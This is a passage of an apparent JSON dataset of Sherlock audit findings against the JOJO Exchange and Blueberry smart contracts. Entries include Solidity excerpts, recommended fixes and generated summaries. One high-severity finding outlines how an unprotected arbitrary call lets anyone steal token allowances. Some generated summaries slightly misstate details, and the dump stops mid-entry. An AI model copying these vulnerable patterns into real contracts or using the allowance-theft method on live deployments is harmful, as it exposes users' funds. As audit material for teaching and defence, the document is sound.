      "id": "18473",
      "title": "M-6: Lack of burn mechanism for JUSD repayments causes oversupply of JUSD",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/306 \n\n## Found by \nRuhum, igingu, immeas, peakbolt\n## Summary\n\n`JUSDBank.repay()` allow users to repay their JUSD debt and interest by transfering in JUSD tokens. Without a burn mechanism, it will cause an oversupply of JUSD that is no longer backed by any collateral.\n\n\n\n\n## Vulnerability Detail\n\n`JUSDBank` receives JUSD tokens for the repayment of debt and interest. However, there are no means to burn these tokens, causing JUSD balance in JUSDBank to keep increasing. \n\nThat will lead to an oversupply of JUSD that is not backed by any collateral. And the oversupply of JUSD will increase significantly during market due to mass repayments from liquidation.\n\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L307-L330\n```Solidity\n    function _repay(\n        DataTypes.UserInfo storage user,\n        address payer,\n        address to,\n        uint256 amount,\n        uint256 tRate\n    ) internal returns (uint256) {\n        require(amount != 0, JUSDErrors.REPAY_AMOUNT_IS_ZERO);\n        uint256 JUSDBorrowed = user.t0BorrowBalance.decimalMul(tRate);\n        uint256 tBorrowAmount;\n        uint256 t0Amount;\n        if (JUSDBorrowed <= amount) {\n            tBorrowAmount = JUSDBorrowed;\n            t0Amount = user.t0BorrowBalance;\n        } else {\n            tBorrowAmount = amount;\n            t0Amount = amount.decimalDiv(tRate);\n        }\n        IERC20(JUSD).safeTransferFrom(payer, address(this), tBorrowAmount);\n        user.t0BorrowBalance -= t0Amount;\n        t0TotalBorrowAmount -= t0Amount;\n        emit Repay(payer, to, tBorrowAmount);\n        return tBorrowAmount;\n    }\n```\n\n## Impact\n\nTo maintain its stability, JUSD must always be backed by more than 1 USD worth of collateral. \n\nWhen there is oversupply of JUSD that is not backed by any collateral, it affects JUSD stability and possibly lead to a depeg event.\n\n\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L307-L330\n\n\n## Tool used\nManual review\n\n## Recommendation\nInstead of transfering to the JUSDBank upon repayment, consider adding a burn mechanism to reduce the supply of JUSD so that it will be adjusted automatically.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nWill add burn mechanism in the contract\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/JUSDV1/commit/a72604efba3a9cbce997aefde742be4c5036a039\n\n**IAm0x52**\n\nFix looks good. Excess JUSD can now be refunded by the owner",
      "summary": "\nThis bug report is about the lack of burn mechanism for JUSD repayments, which causes an oversupply of JUSD that is no longer backed by any collateral. This issue was found by Ruhum, igingu, immeas, and peakbolt. \n\nThe `JUSDBank.repay()` function allows users to repay their JUSD debt and interest by transfering in JUSD tokens. However, there are no means to burn these tokens, causing JUSD balance in JUSDBank to keep increasing. This leads to an oversupply of JUSD that is not backed by any collateral, which will increase significantly during market due to mass repayments from liquidation.\n\nThis oversupply of JUSD affects its stability and could lead to a depeg event. To fix this issue, a burn mechanism was added to the contract to reduce the supply of JUSD and adjust it automatically. The fix looks good and excess JUSD can now be refunded by the owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/306",
      "tags": [],
      "finders": [
        "igingu",
        "peakbolt",
        "Ruhum",
        "immeas"
      ]
    },
    {
      "id": "18472",
      "title": "M-5: When the `JUSDBank.withdraw()` is to another internal account the `ReserveInfo.isDepositAllowed` is not validated",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/230 \n\n## Found by \n0xbepresent, carrotsmuggler, caventa\n## Summary\n\nThe [internal withdraw](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L348) does not validate if the collateral reserve has activated/deactivated the [isDepositAllowed](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/lib/DataTypes.sol#LL37C14-L37C30) variable\n\n## Vulnerability Detail\n\nThe [JUSDBank.withdraw()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L128) function has a param called [isInternal](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L132) that helps to indicate if the withdraw amount is internal between accounts or not. When the withdraw is internal the `ReserveInfo.isDepositAllowed` is not validated.\n\n```solidity\nFile: JUSDBank.sol\n332:     function _withdraw(\n333:         uint256 amount,\n334:         address collateral,\n335:         address to,\n336:         address from,\n337:         bool isInternal\n338:     ) internal {\n...\n...\n348:         if (isInternal) {\n349:             DataTypes.UserInfo storage toAccount = userInfo[to];\n350:             _addCollateralIfNotExists(toAccount, collateral);\n351:             toAccount.depositBalance[collateral] += amount;\n352:             require(\n353:                 toAccount.depositBalance[collateral] <=\n354:                     reserve.maxDepositAmountPerAccount,\n355:                 JUSDErrors.EXCEED_THE_MAX_DEPOSIT_AMOUNT_PER_ACCOUNT\n356:             );\n...\n...\n```\n\nIn the other hand, the `isDepositAllowed` is validated in the [deposit](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L247) function in the `code line 255` but the withdraw to internal account is not validated.\n\n```solidity\nFile: JUSDBank.sol\n247:     function _deposit(\n248:         DataTypes.ReserveInfo storage reserve,\n249:         DataTypes.UserInfo storage user,\n250:         uint256 amount,\n251:         address collateral,\n252:         address to,\n253:         address from\n254:     ) internal {\n255:         require(reserve.isDepositAllowed, JUSDErrors.RESERVE_NOT_ALLOW_DEPOSIT);\n```\n\nAdditionally, the `ReserveInfo.isDepositAllowed` can be modified via the [JUSDOperation.delistReserve()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDOperation.sol#L227) function. So any collateral's deposits can be deactivated at any time.\n\n```solidity\nFile: JUSDOperation.sol\n227:     function delistReserve(address collateral) external onlyOwner {\n228:         DataTypes.ReserveInfo storage reserve = reserveInfo[collateral];\n229:         reserve.isBorrowAllowed = false;\n230:         reserve.isDepositAllowed = false;\n231:         reserve.isFinalLiquidation = true;\n232:         emit RemoveReserve(collateral);\n233:     }\n```\n\n## Impact\n\nThe collateral's reserve can get deposits via the [internal withdraw](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L348-L356) even when the `Reserve.isDepositAllowed` is turned off making the `Reserve.isDepositAllowed` useless because the collateral deposits can be via `internal withdrawals`.\n\n## Code Snippet\n\nThe [internal withdraw code](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L348-L356)\n\n## Tool used\n\nManual review\n\n## Recommendation\n\nAdd a `Reserve.isDepositAllowed` validation when the withdrawal is to another internal account.\n\n```diff\nFile: JUSDBank.sol\n    function _withdraw(\n        uint256 amount,\n        address collateral,\n        address to,\n        address from,\n        bool isInternal\n    ) internal {\n...\n...\n        if (isInternal) {\n++          require(reserve.isDepositAllowed, JUSDErrors.RESERVE_NOT_ALLOW_DEPOSIT);\n            DataTypes.UserInfo storage toAccount = userInfo[to];\n            _addCollateralIfNotExists(toAccount, collateral);\n            toAccount.depositBalance[collateral] += amount;\n            require(\n                toAccount.depositBalance[collateral] <=\n                    reserve.maxDepositAmountPerAccount,\n                JUSDErrors.EXCEED_THE_MAX_DEPOSIT_AMOUNT_PER_ACCOUNT\n            );\n...\n...\n```\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/JUSDV1/commit/4071d470c126bac25b1a391d5dc1582db258280d\n\n**IAm0x52**\n\nFix looks good. I don't agree with the validity of this issue as it's not really a deposit (no new assets are entering the bank) but more of a transfer. However this fix does prevent this behavior.",
      "summary": "\nThis bug report is about an issue found in the JUSDBank.sol file of the JOJO Exchange. It was found by 0xbepresent, carrotsmuggler, and caventa and is labeled as issue M-5. The issue is that when the JUSDBank.withdraw() function is used to transfer funds to another internal account, the ReserveInfo.isDepositAllowed variable is not validated. This means that a collateral's deposits can be made even when the Reserve.isDepositAllowed is turned off, making the variable useless. \n\nThe code snippet in the report shows the internal withdraw function, which does not include a validation of the Reserve.isDepositAllowed variable. However, the deposit function does validate the variable, which can be modified via the JUSDOperation.delistReserve() function. \n\nThe impact of this issue is that the Reserve.isDepositAllowed variable is rendered useless, as deposits can still be made even when the variable is turned off. \n\nThe recommendation for fixing this issue is to add a Reserve.isDepositAllowed validation when the withdrawal is to another internal account. A code snippet is provided to show how this can be done. \n\nFinally, a discussion between two users is included in the report. JoscelynFarr provides a link to a fix, while IAm0x52 agrees with the fix and does not agree with the validity of the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/230",
      "tags": [],
      "finders": [
        "caventa",
        "0xbepresent",
        "carrotsmuggler"
      ]
    },
    {
      "id": "18471",
      "title": "M-4: Unable to liquidate USDC blacklisted user's loan due to transferring leftover collateral back in USDC",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/206 \n\n## Found by \nInspex, jprod15, m9800, monrel, peakbolt\n\n## Summary\nDuring the loan liquidation process, any remaining collateral will be swapped to USDC tokens and transferred to the liquidated user. However, if the USDC contract blacklists the liquidated user, the liquidation transaction will be revert. As a result, the user's loan will be unable to be liquidated if they have been blacklisted by the USDC token contract.\n\n\n## Vulnerability Detail\n\nDuring the liquidation process, any remaining tokens will be transferred to the owner of the loan. However, if the loan owner has been blacklisted by USDC token, this flow will be reverted due to the code shown below.\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L199-L204\n\nAs a result, users who have been blacklisted by USDC will be unable to liquidate their loan positions during the period of the blacklisting.\n\n## Impact\nThe liquidation process might DoS due to its reliance on paying back remaining tokens in USDC only. This will error where transferring USDC tokens to blacklisted users can cause the transaction to be reverted, disrupting the liquidation flow. This will result in a bad debt for the platform.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L199-L204\n\n## Tool used\n\nManual Review\n\n## Recommendation\nWe suggest implementing one or all of the following solutions:\n1. Prevent USDC blacklisted users from opening a loan position until they are no longer blacklisted. This can be done by implementing a blacklist check during the borrowing process.\n2. Remove the transfer of remaining USDC tokens to the liquidated user during the liquidation flow. Instead, allow the user to withdraw their remaining USDC tokens on their own after the liquidation process is complete.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nWe will allow partial liquidation to avoid this happened.",
      "summary": "\nThis bug report outlines an issue with the loan liquidation process in which a user's loan is unable to be liquidated if they have been blacklisted by the USDC token contract. During the liquidation process, any remaining collateral will be swapped to USDC tokens and transferred to the liquidated user. If the USDC contract blacklists the liquidated user, the liquidation transaction will be reverted and the user's loan will remain open. This can cause a bad debt for the platform and disrupt the liquidation flow. The code snippet provided shows the code that is causing the issue. \n\nTwo potential solutions are suggested to prevent this issue from occurring. The first is to prevent USDC blacklisted users from opening a loan position until they are no longer blacklisted. This can be done by implementing a blacklist check during the borrowing process. The second suggestion is to remove the transfer of remaining USDC tokens to the liquidated user during the liquidation flow. Instead, allow the user to withdraw their remaining USDC tokens on their own after the liquidation process is complete.\n\nJoscelynFarr suggested allowing partial liquidation to avoid this issue from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/206",
      "tags": [],
      "finders": [
        "jprod15",
        "Inspex",
        "peakbolt",
        "m9800",
        "monrel"
      ]
    },
    {
      "id": "18470",
      "title": "M-3: It's possible to reset primaryCredit and secondaryCredit for insurance account",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/159 \n\n## Found by \nGalloDaSballo, p0wd3r, rvierdiiev\n## Summary\nWhen because of negative credit after liquidations of another accounts, insurance address doesn't pass `isSafe` check, then malicious user can call JOJOExternal.handleBadDebt and reset both primaryCredit and secondaryCredit for insurance account.\n## Vulnerability Detail\n`insurance` account is handled by JOJO team. Team is responsible to top up this account in order to cover losses. When [bad debt is handled](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/impl/Perpetual.sol#L165), then its negative credit value is added to the insurance account. Because of that it's possible that primaryCredit of insurance account is negative and `Liquidation._isSafe(state, insurance) == false`.\n\nAnyone can call [`JOJOExternal.handleBadDebt` function](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/impl/JOJOExternal.sol#L56-L58).\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Liquidation.sol#L399-L418\n```solidity\n    function handleBadDebt(Types.State storage state, address liquidatedTrader)\n        external\n    {\n        if (\n            state.openPositions[liquidatedTrader].length == 0 &&\n            !Liquidation._isSafe(state, liquidatedTrader)\n        ) {\n            int256 primaryCredit = state.primaryCredit[liquidatedTrader];\n            uint256 secondaryCredit = state.secondaryCredit[liquidatedTrader];\n            state.primaryCredit[state.insurance] += primaryCredit;\n            state.secondaryCredit[state.insurance] += secondaryCredit;\n            state.primaryCredit[liquidatedTrader] = 0;\n            state.secondaryCredit[liquidatedTrader] = 0;\n            emit HandleBadDebt(\n                liquidatedTrader,\n                primaryCredit,\n                secondaryCredit\n            );\n        }\n    }\n```\nSo it's possible for anyone to call `handleBadDebt` for `insurance` address, once its primaryCredit is negative and `Liquidation._isSafe(state, insurance) == false`. This will reset both primaryCredit and secondaryCredit variables to 0 and break insurance calculations.\n## Impact\nInsurance primaryCredit and secondaryCredit variables are reset.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nDo not allow `handleBadDebt` call with insurance address.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link: \nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/78c53b4721ae7bb97fb922f78342d0ee4a1825dd\n\n**IAm0x52**\n\nFix looks good. Since the order has been changed, clearing bad debt on the insurance account will result it in still having the same debt before and after the call",
      "summary": "\nThis bug report is about an issue with the JOJO Exchange smart contract. The issue is that it is possible to reset the primaryCredit and secondaryCredit for the insurance account when a negative credit occurs after liquidation of another account. This was discovered by GalloDaSballo, p0wd3r, and rvierdiiev. \n\nThe insurance account is handled by the JOJO team and is responsible for covering losses. When a bad debt is handled, the negative credit value is added to the insurance account. If the primaryCredit of the insurance account is negative, then anyone can call the JOJOExternal.handleBadDebt function which will reset both the primaryCredit and secondaryCredit variables to 0, breaking the insurance calculations.\n\nThe impact of this issue is that the insurance primaryCredit and secondaryCredit variables are reset. The code for the fix was provided in the report, which was reviewed by JoscelynFarr and IAm0x52. The recommendation is to not allow the handleBadDebt call with the insurance address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/159",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "GalloDaSballo",
        "p0wd3r"
      ]
    },
    {
      "id": "18469",
      "title": "M-2: Subaccount#execute lacks payable",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/111 \n\n## Found by \n0xlmanini, Brenzee, T1MOH, ctf\\_sec, immeas, n1punp, nobody2018, p0wd3r, rvierdiiev, yixxas\n## Summary\n\n`Subaccount#execute` lacks `payable`. If `value` in `Subaccount#execute` is not zero, it could always revert.\n\n## Vulnerability Detail\n\n`Subaccount#execute` lacks `payable`. The caller cannot send the value.\n\n```solidity\nfunction execute(address to, bytes calldata data, uint256 value) external onlyOwner returns (bytes memory){\n        require(to != address(0));\n->      (bool success, bytes memory returnData) = to.call{value: value}(data);\n        if (!success) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        emit ExecuteTransaction(owner, address(this), to, data, value);\n        return returnData;\n    }\n```\n\nThe `Subaccount` contract does not implement `receive() payable` or `fallback() payable`, so it is unable to receive value (eth) . Therefore, `Subaccount#execute` needs to add `payable`.\n\n## Impact\n\n`Subaccount#execute` cannot work if `value` != 0.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/subaccount/Subaccount.sol#L45-L58\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd a `receive() external payable` to the contract or `execute()` to add a `payable` modifier.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/64dfd055deeae857fa99d4703cdbf7ba1291b8ad\n\n**IAm0x52**\n\nFix looks good. `execute()` is now payable and value is check to make sure no ETH is left in the contract",
      "summary": "\nThis bug report is about the `Subaccount#execute` function in the `Subaccount` contract which lacks a `payable` modifier. This means that if the `value` in the `Subaccount#execute` is not zero, it will always revert. This vulnerability was found by 0xlmanini, Brenzee, T1MOH, ctf\\_sec, immeas, n1punp, nobody2018, p0wd3r, rvierdiiev, and yixxas, and was confirmed by JoscelynFarr and IAm0x52. The code snippet can be found at https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/subaccount/Subaccount.sol#L45-L58. The impact of this vulnerability is that `Subaccount#execute` cannot work if `value` != 0. The recommendation is to add a `receive() external payable` to the contract or add a `payable` modifier to `execute()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/111",
      "tags": [],
      "finders": [
        "n1punp",
        "yixxas",
        "immeas",
        "p0wd3r",
        "0xlmanini",
        "T1MOH",
        "Brenzee",
        "nobody2018",
        "rvierdiiev",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18468",
      "title": "M-1: JUSD borrow fee rate is less than it should be",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/73 \n\n## Found by \nBenRai, RaymondFam, Ruhum, carrotsmuggler, y1cunhui\n## Summary\nThe borrow fee rate calculation is wrong causing the protocol to take less fees than it should.\n\n## Vulnerability Detail\nThe borrowFeeRate is calculated through `getTRate()`:\n\n```sol\n    function getTRate() public view returns (uint256) {\n        uint256 timeDifference = block.timestamp - uint256(lastUpdateTimestamp);\n        return\n            t0Rate +\n            (borrowFeeRate * timeDifference) /\n            JOJOConstant.SECONDS_PER_YEAR;\n    }\n```\n`t0Rate` is initialized as `1e18` in the test contracts:\n\n```sol\n    constructor(\n        uint256 _maxReservesNum,\n        address _insurance,\n        address _JUSD,\n        address _JOJODealer,\n        uint256 _maxPerAccountBorrowAmount,\n        uint256 _maxTotalBorrowAmount,\n        uint256 _borrowFeeRate,\n        address _primaryAsset\n    ) {\n        // ...\n        t0Rate = JOJOConstant.ONE;\n    }\n```\n\n`SECONDS_PER_YEAR` is equal to `365 days` which is `60 * 60 * 24 * 365 = 31536000`:\n\n```sol\nlibrary JOJOConstant {\n    uint256 public constant SECONDS_PER_YEAR = 365 days;\n}\n```\n\nAs time passes, `getTRate()` value will increase. When a user borrows JUSD the contract doesn't save the actual amount of JUSD they borrow, `tAmount`. Instead, it saves the current \"value\" of it, `t0Amount`:\n\n```sol\n    function _borrow(\n        DataTypes.UserInfo storage user,\n        bool isDepositToJOJO,\n        address to,\n        uint256 tAmount,\n        address from\n    ) internal {\n        uint256 tRate = getTRate();\n        //        tAmount % tRate ？ tAmount / tRate + 1 ： tAmount % tRate\n        uint256 t0Amount = tAmount.decimalRemainder(tRate)\n            ? tAmount.decimalDiv(tRate)\n            : tAmount.decimalDiv(tRate) + 1;\n        user.t0BorrowBalance += t0Amount;\n```\n\nWhen you repay the JUSD, the same calculation is done again to decrease the borrowed amount. Meaning, as time passes, you have to repay more JUSD.\n\nLet's say that JUSDBank was live for a year with a borrowing fee rate of 10% (1e17). `getTRate()` would then return:\n$1e18 + 1e17 * 31536000 / 31536000 = 1.1e18$\n\nIf the user now borrows 1 JUSD we get: $1e6 * 1e18 / 1.1e18 ~= 909091$ for `t0Amount`. That's not the expected 10% decrease. Instead, it's about 9.1%.\n\n## Impact\nUsers are able to borrow JUSD for cheaper than expected\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L274-L286\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/lib/JOJOConstant.sol#L7\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L37\n## Tool used\n\nManual Review\n\n## Recommendation\nChange formula to:\n`t0Amount = tAmount - tAmount.decimalMul(tRate)` where `t0Rate` is initialized with `0` instead of `1e18`.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/JUSDV1/commit/334fb691eea57a96fb7220e67e31517638725a80\n\n**IAm0x52**\n\nFix looks good. Interest is now accumulated with each state update rather than only when the rate is changed.",
      "summary": "\nA bug was found in the JUSD borrow fee rate calculation which caused the protocol to take less fees than it should. Five users - BenRai, RaymondFam, Ruhum, carrotsmuggler, and y1cunhui - found the vulnerability when manually reviewing the code. The vulnerability was caused by the `getTRate()` function, which calculates the borrow fee rate. The `t0Rate` was initialized as `1e18` in the test contracts, and the `SECONDS_PER_YEAR` was equal to `365 days`, which is `60 * 60 * 24 * 365 = 31536000`. When a user borrows JUSD, the contract saves the current \"value\" of it, `t0Amount`, which was not the expected 10% decrease. This allowed users to borrow JUSD for cheaper than expected. JoscelynFarr provided a fix link, and IAm0x52 confirmed that the fix looked good. The fix was to change the formula to `t0Amount = tAmount - tAmount.decimalMul(tRate)` where `t0Rate` is initialized with `0` instead of `1e18`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/73",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "y1cunhui",
        "RaymondFam",
        "Ruhum",
        "BenRai"
      ]
    },
    {
      "id": "18467",
      "title": "H-1: All allowances to DepositStableCoinToDealer and GeneralRepay can be stolen due to unsafe call",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/428 \n\n## Found by \n0x52, 0xkazim, ArbitraryExecution, Bauer, BowTiedOriole, GalloDaSballo, Inspex, Jigsaw, MalfurionWhitehat, XDZIBEC, ctf\\_sec, dingo, jprod15, lil.eth, tvdung94, yy\n## Summary\n\nDepositStableCoinToDealer.sol and GeneralRepay.sol are helper contracts that allow a user to swap and enter JOJODealer and JUSDBank respectively. The issue is that the call is unsafe allowing the contract to call the token contracts directly and transfer tokens from anyone who has approved the contract.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/stableCoin/DepositStableCoinToDealer.sol#L30-L44\n\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        (address approveTarget, address swapTarget, bytes memory data) = abi\n        .decode(param, (address, address, bytes));\n        // if usdt\n        IERC20(asset).approve(approveTarget, 0);\n        IERC20(asset).approve(approveTarget, amount);\n        (bool success, ) = swapTarget.call(data);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n\nWe can see above that the call is totally unprotected allowing a user to make any call to any contract. This can be abused by calling the token contract and using the allowances of others. The attack would go as follows:\n\n1. User A approves the contract for 100 USDT\n2. User B sees this approval and calls depositStableCoin with the swap target as the USDT contract with themselves as the receiver\n3. This transfers all of user A USDT to them\n\n## Impact\n\nAll allowances can be stolen\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/stableCoin/DepositStableCoinToDealer.sol#L23C14-L50\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOnly allow users to call certain whitelisted contracts.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/JUSDV1/commit/5770d15edac41c78d9726f02e988aa8e14601f3e\nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/94ea554ec1c563e945bd388051f6438826818b47\n\n**IAm0x52**\n\nFixes look good. GeneralRepay and DepositStableCoinToDealer now implement contract whitelists",
      "summary": "\nThis bug report is about two helper contracts, DepositStableCoinToDealer.sol and GeneralRepay.sol, which allow a user to swap and enter JOJODealer and JUSDBank respectively. The issue is that the call is unsafe allowing the contract to call the token contracts directly and transfer tokens from anyone who has approved the contract. This means that anyone who has approved the contract can have their tokens stolen. \n\nThe vulnerability lies in the code snippet which allows the contract to call the token contracts without any protection. An attacker can take advantage of this by seeing the approval of a user, and then calling the depositStableCoin with themselves as the receiver, thus transferring all of the user's tokens to themselves.\n\nThe impact of this bug would be that all allowances can be stolen. This was found through manual review.\n\nThe bug was fixed by implementing contract whitelists, so that only whitelisted contracts can be called. This was confirmed by 0x52 and IAm0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/428",
      "tags": [],
      "finders": [
        "dingo",
        "BowTiedOriole",
        "yy",
        "ctf\\_sec",
        "jprod15",
        "Bauer",
        "0x52",
        "Jigsaw",
        "Inspex",
        "GalloDaSballo",
        "ArbitraryExecution",
        "0xkazim",
        "XDZIBEC",
        "lil.eth",
        "tvdung94",
        "MalfurionWhitehat"
      ]
    },
    {
      "id": "18507",
      "title": "M-13: Missing checks for whether Arbitrum Sequencer is active",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/142 \n\n## Found by \n0xepley, Bauchibred, Bauer, Brenzee, J4de, ctf\\_sec, deadrxsezzz, tallo, tsvetanovv\n## Summary\n\nMissing checks for whether Arbitrum Sequencer is active\n\n## Vulnerability Detail\n\nthe onchain deployment context is changed, in prev contest the protocol only attemps to deploy the code to ethereum while in the current contest\n\nthe protocol intends to deploy to arbtrium as well!\n\nChainlink recommends that users using price oracles, check whether the Arbitrum sequencer is active\n\nhttps://docs.chain.link/data-feeds#l2-sequencer-uptime-feeds\n\nIf the sequencer goes down, the index oracles may have stale prices, since L2-submitted transactions (i.e. by the aggregating oracles) will not be processed.\n\n## Impact\n\nStale prices, e.g. if USDC were to de-peg while the sequencer is offline, stale price is used and can result in false liquidation or over-borrowing.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L76-L98\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse sequencer oracle to determine whether the sequencer is offline or not, and don't allow orders to be executed while the sequencer is offline.",
      "summary": "\nThis bug report is about the missing checks for whether the Arbitrum Sequencer is active. It was found by 0xepley, Bauchibred, Bauer, Brenzee, J4de, ctf\\_sec, deadrxsezzz, tallo, and tsvetanovv. The protocol intends to deploy to Arbtrium, and Chainlink recommends that users using price oracles check whether the Arbitrum sequencer is active. If the sequencer goes down, the index oracles may have stale prices which can result in false liquidation or over-borrowing. The code snippet for this issue can be found at the given link. The tool used was Manual Review. The recommendation is to use sequencer oracle to determine whether the sequencer is offline or not, and not to allow orders to be executed while the sequencer is offline.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/142",
      "tags": [
        "Stale Price",
        "Oracle",
        "Missing-Logic",
        "L2 Sequencer",
        "Arbitrum"
      ],
      "finders": [
        "Bauer",
        "J4de",
        "tallo",
        "tsvetanovv",
        "deadrxsezzz",
        "Brenzee",
        "Bauchibred",
        "0xepley",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18506",
      "title": "M-12: rewardTokens removed from WAuraPool/WConvexPools will be lost forever",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/128 \n\n## Found by \n0x52\n## Summary\n\npendingRewards pulls a fresh count of reward tokens each time it is called. This is problematic if reward tokens are ever removed from the the underlying Aura/Convex pools because it means that they will no longer be distributed and will be locked in the contract forever.\n\n## Vulnerability Detail\n\n[WAuraPools.sol#L166-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L166-L189)\n\n        uint extraRewardsCount = IAuraRewarder(crvRewarder)\n            .extraRewardsLength();\n        tokens = new address[](extraRewardsCount + 1);\n        rewards = new uint256[](extraRewardsCount + 1);\n\n        tokens[0] = IAuraRewarder(crvRewarder).rewardToken();\n        rewards[0] = _getPendingReward(\n            stCrvPerShare,\n            crvRewarder,\n            amount,\n            lpDecimals\n        );\n\n        for (uint i = 0; i < extraRewardsCount; i++) {\n            address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n            uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n            tokens[i + 1] = 